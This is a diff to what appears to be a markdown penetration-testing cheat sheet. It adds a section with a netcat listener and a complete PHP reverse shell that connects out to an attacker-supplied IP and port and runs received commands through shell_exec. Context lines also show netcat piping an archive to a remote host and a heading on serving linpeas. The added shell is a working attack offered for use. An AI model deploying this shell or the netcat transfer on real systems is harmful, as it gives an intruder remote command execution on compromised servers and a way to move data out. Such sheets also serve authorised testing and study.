@@ -34,6 +34,31 @@ cat directory.tar.gz | nc example.com 1234
 nc -l -p 1234 > directory.tar.gz
 ```
 
+## PHP reverse shell
+```bash
+nc -lvnp 4444
+```
+```php
+<?php
+$ip = 'x.x.x.x'; // change this to your IP address
+$port = 4444; // change this to your listening port
+$socket = fsockopen($ip, $port);
+if ($socket) {
+    $shell = 'uname -a; w; id; /bin/sh -i';
+    fwrite($socket, $shell);
+    while (!feof($socket)) {
+        $command = fgets($socket);
+        $output = '';
+        if ($command) {
+            $output = shell_exec($command);
+            fwrite($socket, $output);
+        }
+    }
+    fclose($socket);
+}
+?>
+```
+
 ## Download and serve `linpeas`
 ### Sender:
 ```bash
